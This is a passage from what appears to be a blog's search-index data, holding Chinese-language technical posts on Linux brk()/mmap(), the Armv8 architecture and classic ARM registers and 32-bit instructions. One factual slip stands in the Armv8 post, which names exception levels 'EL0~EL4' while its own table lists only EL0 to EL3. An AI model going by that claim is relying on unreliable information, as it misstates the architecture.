“内存”，这个边界就往上推进一段距离，同时内核和进程都要记下当前的边界在哪里。在进程这一边由 malloc() 或类似的库函数管理，而在内核中则将当前的边界记录在进程的 mm_struct 结构中。具体地说，mm_struct 结构中有一个成分 brk，表示动态分配区当前的底部。当一个进程需要分配内存时，将要求的大小与其当前的动态分配区底部边界相加，所得的就是所要求的新边界，也就是 brk() 调用时的参数 brk。当内核能满足要求时，系统调用 brk() 返回0，此后新旧两个边界之间的虚存地址就都可以使用了。当内核发现无法满足要求（例如物理空间已经分配完），或者发现新的边界已经过于逼近设于顶部的堆栈时，就拒绝分配而返回-1。 系统调用 brk() 在内核中的实现为 sys_brk()。这个函数既可以用来分配空间，即把动态分配区底部的边界往上推；也可以用来释放，即归还空间。 系统调用 mmap()参考P181，一个进程可以通过系统调用 mmap()， 将一个已打开文件的内容映射到它的用户空间，有点类似 Windows 上的 CreateFileMapping + MapViewOfFile 实现映射内存的过程。 参考资料 《Linux内核源代码情景分析-上册》—— 毛德操/胡希明 博客园-虚拟内存映射：段分割","categories":[],"tags":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://cata1oc.github.io/tags/Linux%E5%86%85%E6%A0%B8/"}]},{"title":"Arm-v8架构简介","slug":"Armv8架构简介","date":"2021-06-03T05:56:41.000Z","updated":"2022-05-17T15:51:25.264Z","comments":true,"path":"2021/06/03/Armv8架构简介/","link":"","permalink":"http://cata1oc.github.io/2021/06/03/Armv8%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/","excerpt":"","text":"前言Arm-v8架构是在2011年10月宣布的，至今也有10年了，但网上大部分关于Arm处理器的内容主要是基于早期经典的Arm-v6架构下的，甚至Arm-v7架构下的资料都很少，关于这两个架构的部分已经在前一篇进行了整理，也是对网上关于Arm寄存器最常见的一些说法进行了总结和筛选。本篇，目标移至目前主流的Arm-v8架构进行简要介绍（由于内容太多了，指令的部分被阉割了），主要内容均参考这本2015年发布的Arm白皮书手册。 新增特性禁止直接修改PC在x86架构中，直接修改EIP（Extended Instruction Pointer，该寄存器指向即将执行的指令，类似Arm处理器中的PC）的值是不被允许的，只能通过间接的方式来实现地址的跳转，例如call, jmp, jcc。但在Arm架构的处理器下，汇编代码是可以直接修改PC（R15）寄存器的值的，这确实给了程序设计者更大的自由，对于艺高胆大的人来说，甚至可以玩出多种花样来。 然而，这种自由的代价就是增加了编译器的复杂度，也阻碍了更深的指令流水线的设计，最终在Arm-v8架构中，直接访问PC的方式也同x86一样，被禁止了。 异常级别在Arm-v8架构下，新增了异常级别（Exception Level）EL0~EL4，用来整合早期架构中的运行模式（Arm-v7架构中的9种运行模式，除了Usr模式以外均为特权模式）与特权级别PLn（Privilege Level，与特权模式对应，只有Usr模式属于非特权级别，其余模式均为特权级别，大多数情况下，软件都运行在用户模式）。有点类似x86架构上的Ring0-Ring3，不同的是x86架构上，Ring3权限最小，Ring0权限最大，并且Ring1-Ring2通常不被使用。Arm-v8架构的异常级别则是，EL4权限最大，EL0权限最小。 有了异常级别的概念后，运行模式与特权级别的概念也就淡化了，EL0属于非特权级别，EL1/2/3属于特权级别。异常级别的使用模型如下： 异常级别 运行的软件 EL0 Normal user applications EL1 Linux OS kernel EL2 Hypervisor（虚拟机监视器，可以跑多个虚拟OS） EL3 Low-level firmware, including the Secure Monitor 总的来说，任何一个软件，不论是应用程序、操作系统内核还是虚拟机监视器，都只能运行在一个异常等级中。但是这个机制也有例外，对于内核虚拟机监视器（in-kernel hypervisor），例如KVM，就可以横跨EL2和EL1这两个异常级别运行。 安全模型Arm-v8架构提供2种安全状态，Secure与Non-secure。Non-secure状态也就是常说的Normal World，Secure状态则对应Secure World。Arm-v8的安全模型基本沿用了Arm-v7 security extension的思路，主要目的保护一些安全应用的数据，例如指纹信息，人脸信息以及加密用的私钥等。该模型不同于特权级别等软件逻辑上的保护，而是一种物理上的隔离，即不同安全状态下，可以访问的物理内存是不同的。和Arm-v7架构一样，Secure Monitor起到看门的作用，用于隔离Normal World和Secure World。 执行状态Arm-v8架构定义了两种执行状态，AArch64与AArch32。这两种执行状态用的是同一套通用寄存器（General-Purpose Registers），AArch32状态是对Arm-v7架构的兼容，它只使用通用寄存器低32位那部分。当处于Arm-v8架构的AArch32状态下，保留了Arm-v7架构定义的特权级别，而在AArch64状态下，特权级别将被异常级别所替代。因此，在执行状态进行转换的时候，就需要根据ELn与PLn的对应关系了。 当处于AArch64状态时，处理器执行的是A64指令集。当进入AArch32状态，处理器会执行A32或T32（Thumb）指令集种的一种。 下图展示了异常级别在不同执行状态下的组织结构： 寄存器组织(AArch64)寄存器组织这里主要以AArch64执行状态为主，AArch32与Arm-v7架构类似，在最后一部分会提到，关于Arm-v7架构的寄存器组织可以先参考前一篇文章进行了解。 通用寄存器首先是通用寄存器，Arm-v8架构有31个通用寄存器X0-X30，而Arm-v7架构仅有16个通用寄存器R0-R15。下面按组介绍各通用寄存器的功能： 参数寄存器（X0~X7）: 通常用来传递函数的参数或是保存函数返回值，最多可以用来暂存函数的前8个参数。 易失性寄存器（X9~X15）: Caller-saved temporary registers，顾名思义，调用者需要保存的临时寄存器，也叫做易失性寄存器。当调用者试图调用子程序时，如果想继续使用这几个寄存器中的值，就需要在调用前，将这几个寄存器的值暂存到堆栈中。如果子程序中修改了这几个寄存器的值，在返回前，是不会恢复这几个寄存器中的值的。 非易失性寄存器（X19~X28）: Callee-saved registers，同理，被调用的子程序需要保存的寄存器，也叫做非易失性寄存器。在进入子程序时，子程序需要先将这些寄存器保存到堆栈中，然后再执行主体程序。在返回上层函数之前，也需要将这些寄存器恢复后再返回。因此调用者，可以不必保存这些寄存器。 特殊用途寄存器（X8, X16~X18, X29, X30）: X8：间接结果寄存器。用来保存间接结果的地址，例如返回值是一个结构体时，保存结构体的地址。 子程序内部调用寄存器（Intra-Procedure-Call Temporary Registers），IP0与IP1，这俩寄存器可被Veneers（实现Arm/Thumb状态切换，由链接器插入的一小段代码）或类似的代码所用。或是用于在子程序调用前，作为存储中间值的临时寄存器。使用时不需要保存，但尽量不要用。 x18：平台寄存器（Platform Register），用于保存当前所用的平台的ABI，尽量不要使用。 x29：帧指针寄存器（FP），用于连接栈帧，使用时必须保存。 x30：链接寄存器（LR），用于保存子程序的返回地址。 特殊寄存器除了31个核心寄存器外，还有一些特殊的寄存器。如下图所示： 这里注意一点，官方白皮书特意说明了，没有X31/W31寄存器，很多指令集用X31/W31寄存器来表示零寄存器（ZR）或者栈帧寄存器（SP），这个说法是错误的，但因为传播广泛，从而造成了误导，包括兰新宇这篇中也是。 零寄存器（ZR）: 在Linux的根文件系统中，dev目录下有个特殊的设备文件”zero”。作为source，读取”/dev/zero”可以产生众多的null字符(0x00)；作为sink，任何写入”/dev/zero”的字符都将被吞没。 事实上，这两种应用的需求都是广泛存在的，所以ARMv8也在硬件层面引入了一个新的Zero Register（XZR/WZR），效果和软件层面的”/dev/zero”类似，作为源寄存器产生0，作为目标寄存器丢弃传入的数据。 比如我们要将一些变量赋值为0，因为ARM不允许直接操作内存单元上的数据，所以需要先将一个寄存器置为0，然后再讲这个寄存器的内容store到变量所在的内存单元上，像这样： Code12mov r0, #0str r0, [...] 有了zero register，一条指令就可以解决问题： Code1str wzr, [...] 栈指针寄存器（SP）: SP（Stack Pointer）寄存器，这个Arm-v7也有，很好理解。不同的是，Arm-v8架构下，随着异常级别的引入。每个异常级别都有自己的栈指针寄存器，SP_EL0、SP_EL1、SP_EL2、SP_EL3。对于不同的异常级别，可访问的SP寄存器情况如下： 表中EL1t/EL2t/EL3t指的就是SP_EL0，简单来说就是处于EL0只能访问SP_EL0，处于ELn(n>0)可以访问SP_ELn和SP_EL0。 程序计数器（PC）: PC（Program Counter）寄存器的作用还是和Arm-v7一样，这里不重复，只是不能被直接访问和修改了，这部分在开头新增特性那也提到过。 异常链接寄存器（ELR）: ELR（Exception Link Register）寄存器也很熟悉，在介绍Arm-v7时就提到过，ELR_hyp与LR_hyp在32位运行状态下共用一个。这里，ELR的作用是保存异常返回地址。 进程状态保存寄存器（SPSR）: SPSR（Saved Program Status Register）寄存器，Arm-v8里的SPSR与Arm-v7里的类似，区别在于Arm-v7的SPSR用来保存CPSR（Current Program Status Register）的值，而Arm-v8里的SPSR用来保存PSTATE（Processor STATE）的值。下图为SPSR的基本 AArch64状态下，SPSR各个位所代表的含义如下： N：负数标志位（Negative result） Z：零标志位（Zero result） C：进位标志位（Carry out） V：溢出标志位（oVerflow） SS：软件单步（Software Step），表示异常发生时是否开启软件单步，我的理解是类似EFlags的TF（Trap Flag）位。 IL：非法（代码）执行状态位（IlLegal Execution State bit），异常一发生，PSTATE的IL位就会被设置。 D：进程状态调试位（Process state Debug mask）。表示是否从检测点（断点处）开始调试异常，软件单步调试事件会根据异常发生时，所在异常级别的SPSR_ELn的D位，决定是否进行调试。 A：系统错误标志位（System Error） I：IRQ标志位。 F：FIQ标志位。 M[4]：表示异常发生时的执行状态，值为0时表示执行状态为AArch64。 M[3:0]：异常发生时，所在模式或所处的异常级别。 在Arm-v8架构下，被写入值的SPSR依赖当前所处的异常级别。例如异常发生在EL1，使用的就是SPSR_EL1，以此类推。 处理器状态（PSTATE）: AArch64没有CPSR，取而代之的是PSTATE（Processor STATE），注意一点，CPSR与PSTATE并不相等，PSTATE是一组特殊寄存器的组合。下图分别为PSTATE各字段单独的含义，以及各组寄存器单独的含义（包含仅AArch32才有的寄存器），这里呢不单独列出来了，直接看英文或者参考上面的SPSR。 系统寄存器在AArch64状态下，系统配置是通过系统寄存器来控制的，主要通过MSR与MRS指令进行操作。在以前的Arm-v7架构上，是通过协处理器（CP15）来操作系统配置的，但是Arm-v8架构的AArch64运行状态不支持协处理器。完整的寄存器名会声明最低可访问的异常级别，例如： TTBR0_EL1，可被EL1，EL2，EL3的程序访问 TTBR0_EL2，可被EL2，EL3的程序访问 访问系统寄存器代码形式如下： Code12MRS x0, TTBR0_EL1 // Move TTBR0_EL1 into x0MSR TTBR0_EL1, x0 // Move x0 into TTBR0_EL1 以下为几个比较重要的系统寄存器，这里仅对功能作简要介绍，不展开。更详细的内容，可以参考白皮书，或者后期对Arm架构进一步深入时会介绍到。 寄存器 说明 作用 n的可选值 CTR_ELn 缓存类型寄存器（Cache Type Register） 有关集成缓存体系结构的信息 0 ELR_ELn 异常链接寄存器（Exception Link Register） 存储导致异常发生的指令的地址 1, 2, 3 ESR_ELn 异常综合表征寄存器（Exception Syndrome Register） 包含导致异常发生的原因等信息 1, 2, 3 HCR_ELn Hypervisor配置寄存器（Hypervisor Configuration Register） 控制虚拟化功能的配置以及EL2的异常捕获。捕获异常时，会将异常(IRQ/FIQ/SError)路由到hypervisor中处理。 2 SCR_ELn 安全配置寄存器（Secure Configuration Register） 控制安全状态以及EL3的异常捕获 3 SCTLR_ELn 系统控制寄存器（System Control Register） 控制体系结构的特征，例如MMU，缓存以及对齐检测 0, 1, 2, 3 SPSR_ELn 进程状态保存寄存器（Saved Program Status Register） 当异常发生，切换运行模式或者异常等级时，保存处理器状态 abt, fiq, irq, und, 1, 2, 3 TPIDR_ELn 用户读写线程ID寄存器（User Read/Write Thread ID Register） 为执行在某个异常级别的软件，提供一个存储其线程身份信息的地方，以方便操作系统管理 0, 1, 2, 3 TTBR0_ELn Hypervisor转换表基址寄存器0（Translation Table Base Register 0） 保存着转换表0的基址，以及被占用的内存信息。在AArch64中，TTBR0有3个，TTBR1只有1个。在双系统切换时（Linux/Tee），需要在ATF中保存/恢复这些寄存器。 1, 2, 3 TTBR1_ELn Hypervisor转换表基址寄存器1（Translation Table Base Register 1) 保存着转换表1的基址，以及被占用的内存信息 1 VBAR_ELn 向量基址寄存器（Vector Based Address Register） 保存任意异常进入ELn时的跳转向量基地址 1, 2, 3 系统控制寄存器系统控制寄存器（System ConTroL Register ），用来控制标准内存，系统设施，并为核心功能函数的实现提供状态信息。系统控制寄存器属于系统寄存器，同样用MSR与MRS指令进行操作。这里不展开介绍了，就先贴个图吧，等以后遇到了再展开讲讲。 NEON与浮点寄存器Arm-v8有32个128-bit的浮点寄存器V0~V31，这32个寄存器用来处理标量浮点运算和NEON指令。需要注意一点，v8-v15是Callee需要保存的，v16-v31是Caller需要保存的，这与通用寄存器是反着的。 对Arm-v7架构的兼容寄存器组织的映射先上图，看的明白： 左图很熟悉了，就是Arm-v7架构下的寄存器组织。再看右图，右图则是Arm-v8架构下，将AArch32状态对应的寄存器组织（也就是Arm-v7架构的寄存器组织）映射到Arm-v8架构下的31个通用寄存器上的情况。所以现在很多说法是，Arm处理器拥有31个通用寄存器和6个状态寄存器，这种说法其实是有误区的。在Arm-v7架构下，仅有16个通用寄存器；而在Arm-v8架构下，有31个通用寄存器，并且在AArch32执行状态下，原先Arm-v7架构所对应的各个寄存器的位置（除状态寄存器外）全部映射到了这31个寄存器上。因此才会被说成，有31个通用寄存器和6个状态寄存器，这也是至今仍有37个寄存器说法的原因之一。 AArch32运行状态下的SPSR与ELR_hyp寄存器作为额外的可以访问并使用系统指令的寄存器，它们并不会映射到AArch64状态下的通用寄存器上。这里面有着一些其它的映射关系，具体如下： SPSR_svc映射到SPSR_EL1 SPSR_hyp映射到SPSR_EL2 ELR_hyp映射到ELR_EL2 还有一些寄存器，它们只在AArch32状态下才使用，但是会保留寄存器的状态，即便在AArch64执行状态下无法访问它们： SPSR_abt SPSR_und SPSR_irq SPSR_fiq 这里白皮书提到一点，如果一个异常导致从AArch32状态的异常级别切换到了AArch64状态的异常级别，那么AArch64状态下，ELR_ELn的高32位会被置零。 AArch32状态下的PSTATE前面说到，在AArch64下，是没有CPSR寄存器的，取而代之的是名为PSTATE的一组寄存器。但是在AArch32状态下，PSTATE字段值的含义将有所改变，并利用空余的字段，构造成可以兼容Arm-v7的PSTATE。当然，这种拥有额外字段PSTATE只能在AArch32状态下可被访问，具体如下： 为了方便比较，下图为AArch64状态下的PSTATE与AArch32状态下PSTATE各字段的对比： 异常级别的切换在Arm-v7架构上，处理器模式可以通过特权级别的软件控制，或者在发生异常时自动切换。当异常发生时，内核会保存当前的执行状态与返回地址，进入到指定的运行模式，并大概率屏蔽掉硬件中断。 下图是对Arm-v7架构上，运行模式与特权级别的总结。应用程序运行在最低特权等级的PL0上，也就是非特权模式。操作系统运行在PL1上，虚拟机监视器以及虚拟化扩展位于PL2。作为连接Secure World与 Normal World的安全监视器（Secure Monitor）同样运行在PL1。 在AArch64执行状态下，处理器模式被映射到了异常级别上（如下图所示）。当AArch32运行状态发生异常时，处理器会切换到支持当前异常处理的异常级别（运行模式）上。 异常级别的切换必须遵循如下规则： 当切换到更高等级的异常级别时，例如从EL0到EL1，表明提升了软件执行时的特权。 不能产生一个低于当前异常级别的异常，例如EL1不能产生一个EL0的异常。 异常处理不能在EL0进行，处理异常必须在更高的异常级别上。 异常会导致程序流程的改变，后面省略，参考白皮书P34。 异常处理结束，并返回先前异常级别时，是通过ERET指令实现的。 从一个异常返回时，可以仍然处于发生异常的异常级别，或者返回到一个更低的异常级别中，但是不能进入到更高的异常级别中。例如从EL1返回，可能仍然位于EL1，或者返回到EL0，但是不能进入到EL2。 安全状态通常不会随着异常级别的切换而发生改变，除非是EL3直接返回到一个Non-secure状态。（这部分白皮书好像也错了，少了一个not） 执行状态的切换你的操作系统会经常发生执行状态的切换。它可能是这样一种情况，例如，你所运行的是64位操作系统，但你想运行一个32位的应用程序在EL0，这时，你不得不将系统切换成AArch32状态。当程序执行完，再将操作系统切回AArch64执行状态。 一般来说，只能通过切换异常级别来实现执行状态的切换。当发生一个异常时，或许会导致从AArch32切换到AArch64，当从这个异常返回时，又会从AArch64切换回AArch32。这样就实现了执行状态的切换。更多注意要点，这里不再翻译了，参考白皮书P35。 参考资料 《Arm Cortex-A Series Programmer’s Guide for ARMv8-A》2015 Armv8架构寄存器组织 AArch64异常(一)：AArch64异常简介 Arm体系结构知识：汇编、架构、异常级别和安全状态 Winddong-Armv8-AArch64 寄存器和指令集 思否-Armv8架构虚拟化介绍 知乎-Armv8带来的变化 CSDN-Armv8-a架构简介 CSDN-Armv8体系架构简介: AArch64系统级体系结构之编程模型 CSDN-Armv8异常处理简介 CSDN-Armv8架构与指令集.学习笔记 CSDN-Arm通用寄存器传递参数介绍 CSDN-Armv8对CPU虚拟化的支持及L4_fiasco中实现","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://cata1oc.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"传统ARM架构寄存器与指令集","slug":"传统ARM架构寄存器与指令集","date":"2021-05-28T01:13:20.000Z","updated":"2022-05-17T15:50:57.499Z","comments":true,"path":"2021/05/28/传统ARM架构寄存器与指令集/","link":"","permalink":"http://cata1oc.github.io/2021/05/28/%E4%BC%A0%E7%BB%9FARM%E6%9E%B6%E6%9E%84%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E6%8C%87%E4%BB%A4%E9%9B%86/","excerpt":"","text":"前言五一的时候，想整理一下逆向时遇到的一些指令，又想着顺带对寄存器组织也做一个整理，但在查询资料时发现，ARM寄存器相关的坑越来越多，网上的资料也很杂，没有一个统一的说法，甚至官方的白皮书也有矛盾冲突的地方，再加上弄了好久的项目需要收尾和产出报告，直至今日才有空对这部分内容做整理。当然，本篇的整理也可能会有遗漏与错误，在后期回顾时，会对这些问题作出补充与修改。 ARM-v6架构关于查阅资料时遇到的第一个问题，就是ARM处理器到底有多少个寄存器。一开始收集的资料，得到的结论都是ARM处理器一共拥有37个寄存器（包括影子寄存器）。但在查阅ARM白皮书以后，发现在9种运行模式下，共有44个寄存器，接着又查阅了另一版本的ARM白皮书，却只有43个寄存器，这些矛盾的说法让人一时难以判断。 接下来，从ARM-v6架构开始，理清思路，弄明白这些问题。 寄存器组织首先，在网上看到的常说的37个寄存器的寄存器组织模型，其实是ARM-v6及以前架构的，而不是ARM-v7，到了ARM-v7已经不止37个寄存器了。这里先来说经典的ARM-v6架构的寄存器组织，该架构下，共有37个32位寄存器，其中31个为通用寄存器，6个为状态寄存器。具体如下： 16个通用寄存器R0~R15 5个FIQ模式下的R8~R12的影子寄存器 10个异常模式下的R13和R14的影子寄存器 1个状态寄存器CPSR 5个异常模式下的状态寄存器的影子寄存器SPSR 下面来看这些寄存器的主要用途： 未分组寄存器： R0~R7：未被系统用作特殊的用途 R0~R4：这四个寄存器用于传递子程序调用的第1个到第4个参数，多出的参数通过堆栈来传递；R0寄存器同时用于存放子程序的返回结果。 分组寄存器 ： R8~R12： FIQ模式拥有自己的R8_fiq~R12_fiq 其他6种模式下，使用通用寄存器R8~R12 R13~R14： USR和SYS模式共用一组R13~R14 其他5种模式各有独自的一组R13~R14，并采用记号来区分不同的物理寄存器，例如R13_fiq，R14_svc等。 R13：在ARM指令中常用作堆栈指针SP（Stack Pointer）（除USR和SYS模式外，各种模式都有对应的SP_x寄存器）。 R14：称为子程序链接寄存器LR（Link Register），它有两个功能，一个是在任一模式下用于保存函数的返回地址；另一个是在异常模式下保存异常处理后的返回地址（除USR和SYS模式外，各种模式都有对应的LR_x寄存器）。 R15： R15又称作程序计数器（PC），所有模式共用一个PC。对于ARM指令集而言，PC总是指向当前指令下面的第二条指令的地址，可以通过向PC赋值，来控制程序跳转，在ARM工作状态下，PC的值为当前指令的地址值加8个字节。 CPSR： CPSR（Current Program Status Register）当前程序状态寄存器，与PC一样，在任何处理器模式下被访问。它包含了条件标志位、中断禁止位、当前处理器模式标志以及其他的一些控制和状态位，有点类似x86的EFlags寄存器。下图主要介绍其各个位段的含义： SPSR： SPSR（Saved Program Status Register）程序状态保存寄存器，每种异常模式下，都有一个状态寄存器SPSR，用于保存CPSR的状态，以便异常返回后恢复异常发生时的工作状态。用户模式和系统模式不属于异常模式，在这两种模式下访问SPSR，将产生不可预知的后果 以上简要介绍完了基于ARM-v6架构的经典寄存器组织，其中不少寄存器的作用与PC端x86架构下的寄存器类似，下图用于类比这两个架构下功能类似的寄存器，对于有x86基础的玩家能够对ARM寄存器有一个更好的理解。 运行模式前面在介绍寄存器时，提到不同运行模式下，能够访问的寄存器也不同。这部分就来介绍一下运行模式，ARM-v6架构支持7种运行模式，当前所在的运行模式根据CPSR寄存器的低5位进行判断，这些运行模式可以通过软件改变，也可以通过外部中断或异常处理改变。其中，除用户模式外，其余6种均为特权模式；除用户/系统模式外，其余5种均为异常模式。下面具体来看： 支持的7种运行模式： 用户模式（USR）：ARM处理器正常的程序执行模式，不能直接切换到其他模式。 系统模式（SYS）：运行具有特权的操作系统任务，与用户模式类似，但具有可以直接切换到其他模式的特权。 快速中断模式（FIQ）：用于高速数据传输及通道处理，FIQ异常响应时进入此模式。 外部中断模式（IRQ）：用于通用的中断处理，IRQ异常响应时进入此模式。 管理模式（SVC）：又称超级管理员，操作系统使用的保护模式，系统复位和软件中断响应时进入此模式（由系统调用执行软中断SWI命令触发）。这个模式的权限级别非常大，一般情况下不能随便使用。 数据访问终止模式（ABT）：简称退出模式，当数据或指令预取终止时进入该模式，可用于虚拟内存及存储器保护。 未定义指令终止模式（UND）：支持硬件协处理器的软件仿真，当未定义的指令执行时进入该模式。 运行模式的访问区间： CSPR[4:0] 模式 用途 可访问寄存器 10000 用户 正常用户执行模式 PC，R0~R14，CPSR 10001 FIQ 处理快速中断 PC，R8_fiq-R14_fiq，R0-R7，CPSR，SPSR_fiq 10010 IRQ 处理普通中断 PC，R13_irq-R14_irq，R0-R12，CPSR，SPSR_irq 10011 SVC 处理软件中断（SWI） PC，R13_svc-R14_svc，R0-R12，CPSR，SPSR_svc 10111 中止 处理存储器故障 PC，R13_abt-R14_abt，R0-R12，CPSR，SPSR_abt 11011 未定义 处理未定义的指令陷阱 PC，R13_und-R14_und，R0-R12，CPSR，SPSR_und 11111 系统 运行特权操作系统任务 PC，R0~R14，CPSR 寄存器组织与运行模式的关系（ARM-v6）： 工作状态除了寄存器组织与运行模式这两个基本概念，ARM处理器有两种工作状态，即ARM状态与Thumb状态，处理器可以在这两种状态之间随意切换。当处理器处于ARM状态时，会执行32位对齐的ARM指令（4字节，因此前面提到，ARM工作状态下，PC指向的地址是当前地址+8字节）；当处理器处于Thumb状态时，执行的是16位对齐的Thumb指令。Thumb状态下对寄存器的命名与在ARM状态下有一些差异，它们的关系如下： 2种工作状态的命名差异（ARM/Thumb）： Thumb状态下的R0-R7与ARM状态下的R0-R7相同。 Thumb状态下的CPSR与ARM状态下的CPSR相同。 Thumb状态下的FP对应于ARM状态下的R11。 Thumb状态下的IP对应于ARM状态下的R12。 Thumb状态下的SP对应于ARM状态下的R13。 Thumb状态下的LR对应于ARM状态下的R14。 Thumb状态下的PC对应于ARM状态下的R15。 Thumb工作状态下寄存器组织与运行模式的关系： 小结通过上述对ARM-v6架构的介绍，了解到，在早期ARM-v6及以前的架构下，共有37个32位寄存器，7种运行模式以及2种运行状态，这也是大部分人所了解的ARM处理器的架构，也是最经典的一套配置。 ARM-v7架构网上很多资料说的并不准确，37个寄存器的情况应属于ARM-v6及之前的经典ARM架构，并不是ARM-v7架构，到了ARM-v7架构，引入了TrustZone与虚拟化以后，又新增了两个运行模式，也随之增加了一些影子寄存器，此时寄存器的数量，也就不止37个了。下面来看新增的两种运行模式。 运行模式 新增的两个运行模式： 监视模式（MON）：用于安全扩展模式，引入TrustZone技术之后，CPU Core被虚拟出secure state和non-secure state，那么就需要一个能够切换两种state的开关，从而增加了一个moniter（MON） mode。如下图所示： 超级监视模式（HYP）：超级监视者模式，权限比超级管理员（SVC）略低一些，用于虚拟化扩展。 寄存器组织与运行模式的关系（ARM-v7）： 由图，这两张图均是ARM-v7架构的寄存器组织，寄存器的数量分别为43个和44个，这里就对这个矛盾的结论作出解释。经过前文的学习，我们知道ARM-v6及早期架构的ARM处理器包含37个32位的寄存器。在进入ARM-v7的时代以后，随着TrustZone以及虚拟化的引入，又增加了2种运行模式，与之相对的，影子寄存器（Banked Register）也增加了一些。由上图，左图增加了6个影子寄存器，右图增加了7个影子寄存器，区别在于HYP模式下的R14（LR_hyp）寄存器是否存在。 现在来研究这种矛盾出现的情况，先看左图，这张图源自《Arm Cortex-A Series Programmer’s Guide》p45页的插图，也就是官方ARM白皮书里的内容，该白皮书是2011年发布的；再看右图，这张图源自《Arm Cortex-A Series Programmer’s Guide for ARMv8-A》p50页的插图，同样是官方ARM白皮书里的内容，但是要更新一些，是2015年发布的。这里需要补充一个条件，ARM-v8架构是2011年10月官宣的，在此之前，ARM架构处理器，均是32位的运行状态。现在再来看这个LR_hyp寄存器，在32位的运行状态下，它的作用是保存异常返回地址，也就是说LR_hyp和ELR_hyp是公用一个。在64位运行状态下是独立的。因此，在2011年那版的白皮书就给它省略掉了，到了2015年，为了过渡到ARM-v8架构，自然也就独立出来了这个寄存器。这样也就解释清了，为什么官方也会有43个寄存器与44个寄存器这两种说法。当然这些均是ARM-v7架构下的，到了ARM-v8架构，情况又不一样了，这部分留到下篇再讲。 ARM汇编指令(32-bit)前面对于架构与寄存器组织的介绍，更应该算是本篇的附加部分，起初写这篇博客的目的，就是整理一些遇到的不太熟悉的ARM指令，本篇主要介绍32位ARM汇编指令，64位的则会放在下一篇介绍Arm-v8架构的后半部分。对于一些常见且常规的指令，这里就不详细分析，这部分可以参考ARM汇编语言与azeria实验室-ARM指令集，或在文章参考资料ARM汇编指令部分处找到更多32位基础汇编指令的介绍。本篇以实际逆向时遇到的(32位)指令为主，后期也会不定期更新。 VST1.64 {D8-D9}, {R0}!将D8, D9中的元素存储到R0所指的地址上。VST/VLD属于Neon指令，关于Neon指令集的基础内容可参考此篇文章。 VMOV.I32 Q4, #0VMOV指令属于Neon指令，用于将立即数插入到一个单精度/双精度的寄存器中。 VPUSH {D8-D9}VPUSH指令属于Neon指令，用来将一组扩展寄存器Push到栈顶。 IT分支语句（If-Then），该指令根据特定条件来执行紧随其后的1~4条指令，格式为IT{x{y{z}}} {cond}。其中x、y、z分别是执行第二、三、四条指令的条件，可取的值为T（Then）或E（Else），对应于条件的成立和不成立。下面来看例子： Code12345ITETT EQMOVEQ R0, #1; //指令1MOVNE R0, #0; //指令2MOVEQ R1, #0; //指令3MOVEQ R2, #0; //指令4 如图，若EQ条件符合（根据CPSR寄存器Z的值判断），执行指令1、3、4的mov操作，否则执行指令2的mov操作。 LDRD.W R1, R2, [R7, #arg0]看名字以为是加载寄存器对（LoaD Register Dual），实际上是加载到一对寄存器。从基址寄存器（这里是R7）加上偏移后所指向的地址，取两个字（Words），并将这两个字加载到目标寄存器中（这里是R1和R2）。STRD.W与之作用相反。 CBZ R0, loc_BB8CBZ属于跳转指令（可以理解为x86汇编中的jcc指令），常见跳转指令可以参考下图： DCDDCD伪指令属于数据定义指令，用于分配内存，并初始化内存上的内容，相关指令如下图所示： BIC R4, R3, #0x1FC0位清零指令（BIt Clear），格式为BIC{S}{cond} {Rd}, Rn, ，BIC指令用于清楚操作数1的某些位（此处为R3），并把结果放置到目的寄存器中（此处为R4），同时根据操作的结果更新CPSR中相应的条件标志位。操作数2为32位的掩码（此处为0x1FC0）。 MCR P15, 0, R3, C3, C0, 0从寄存器到协处理器的数据传送指令（Move to Coprocessor from Register），此处P15为指令所针对的协处理器名称，第一个0是一个4位的处理器特定的操作码，R3是要传输的ARM寄存器。C3, C0是协处理器寄存器，第二个0一个可选的3位协处理器特定操作码。这条语句的含义是，将ARM处理器寄存器R3中的数据传送到协处理器P15的寄存器C3和C0中。MRC指令的作用与之相反。 PC理解该指令需要先了解ARM处理器的三级流水线机制。 由图，一条汇编指令的运行有三个步骤，取指、译码、执行。当第一条指令执行时，第二条指令已经开始译码，第三条指令正在取值。因此，通常来说，PC指向的是当前指令后面第二条指令的地址。来看下面的例子 如图，首先这里的LDR.W也要说明一下，它是个伪指令，用来从文字池读取常量，且与PC有关的指令。来看PC的作用，首先R10寄存器获取到值off_15108-0xBF14，接下来ADD指令，令PC与R10相加，由于PC指向当前执行指令后面的第二条指令。因此当执行到ADD R10, PC时，PC指向的是LDR.W R0, [R10]这条指令，此时PC的值为0xBF14，因此加上R10后，得到是值刚好是off_15108。当然，这里仅限于此类情况，PC的值还会受到各类异常或所执行的指令集的影响。可以参考以下两篇文章作详细了解关于ARM的PC指针，arm pc指令。 STMEA.W SP, {R0, R9, R11}32位下数据块传输指令（64位下为LDP、STP），格式为LDM/STM {} {类型} 基址寄存器， 寄存器列表。LDM和STM可以实现在一组寄存器和一块连续的内存单元之间传输数据。LDM为加载多个寄存器，STM为存储多个寄存器。LDM、STM的主要用途是现场保存，数据复制，参数传递，其模式有8种： 用于数据块传输： IA：每次传送后地址+4 IB：每次传送前地址+4 DA：每次传送后地址-4 DB：每次传送前地址-4 用于堆栈操作： FA：满递增堆栈 FD：满递减堆栈 EA：空递增堆栈 ED：空递减堆栈 可选后缀： ！：若选用该后缀，表示请求回写，即W=1，则当数据传送完毕之后，将最后的地址写入到基址寄存器中；否则W=0，表示请求不写回，基址寄存器的内容不改变。 篇幅原因，这里仅作概括，更多关于数据块传输指令的完整介绍可以参考此篇 TST R0, #0x3F8位测试，格式为TST{cond} Rn, Operand2，将Rn与Operand2进行与运算，根据结果修改N和Z的值。 ASR R7, R8, R9算术右移（Arithmetic Shift Right），两种格式ASR{S}{cond} Rd, Rm, Rs和ASR{S}{cond} Rd, Rm, #sh都很好理解，将Rm算术右移Rs/#sh位后，把值赋给Rd。 BKPT #1BKPT后跟一个立即数（ARM指令为16位，Thumb指令则为8位），断点指令。该指令使处理器进入调试状态。在特定地址执行到该指令时，调试工具可以使用它来调查系统状态。在ARM状态和Thumb状态下，立即数都被 ARM 硬件忽略。但是，调试器可以使用它来存储断点的附加信息。 参考资料 Armv6/Armv7部分： 《Android软件安全权威指南p223~p227》—— 丰生强 《Arm Cortex-A Series Programmer’s Guide》2011 《Arm Cortex-A Series 